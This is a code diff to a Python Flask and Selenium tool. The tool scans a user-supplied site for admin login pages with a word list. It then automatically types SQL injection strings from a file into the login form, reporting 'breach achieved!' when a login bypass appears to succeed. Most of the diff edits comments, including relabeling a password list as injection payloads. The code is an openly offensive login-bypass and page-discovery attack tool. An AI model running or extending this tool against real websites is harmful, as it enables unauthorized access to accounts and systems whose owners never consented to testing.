@@ -1,6 +1,6 @@
 import asyncio
 import aiohttp
-import selenium
+import selenium.common
 from fake_useragent import UserAgent
 from flask import Flask, request, render_template
 from selenium import webdriver
@@ -36,11 +36,11 @@ def read_sqllist():
 
 
 def login_check(fu):
-    # go to log in webpage
+    # go to the webpage
     driver = webdriver.Edge()
     driver.get(fu)
 
-
+    # try different ID combinations to find username, password, and submit button of page
     try:
         username = driver.find_element(By.ID, "username")
         password = driver.find_element(By.ID, "password")
@@ -63,31 +63,35 @@ def login_check(fu):
                 except selenium.common.exceptions.NoSuchElementException:
                     return
 
-    # retrieve list of passwords (the last password is my real password
+    # retrieve list of SQL injections
     sqllist = read_sqllist()
-    y = ""
-    # loop through password options
+
+    # loop through injection options
     for x in sqllist:
         username.send_keys(x)
         password.send_keys("password")
         driver.execute_script("arguments[0].click();", button)
+        # if injection didn't work, try another one
         if ec.presence_of_element_located((By.ID, "username")):
             username.clear()
             password.clear()
         else:
+            # otherwise, alert user
             print("breach achieved!")
             break
-
 
     # tell driver to wait until webpage gives an alert (it never will), this is so progress can be observed
     WebDriverWait(driver, 200).until(ec.alert_is_present(), "done")
 
+
+''' The code beyond this point was taken from https://github.com/kaloomte/login-snitcher '''
 
 word_list = read_wordlist()
 founded_url = []
 
 
 async def search_login(session, url, word):
+    # function to search for admin login page, prints different message depending on whether page was found
     try:
         async with session.get(url + word, allow_redirects=False, verify_ssl=False) as response:
             status_code = response.status
@@ -113,6 +117,7 @@ async def search_login(session, url, word):
 
 @app.route("/", methods=["POST", "GET"])
 async def home():
+    # main function, responsible for retrieving information from user and deploying functions accordingly
     if request.method == "POST":
         url = request.form["nm"]
         if url[0:3] == "www":
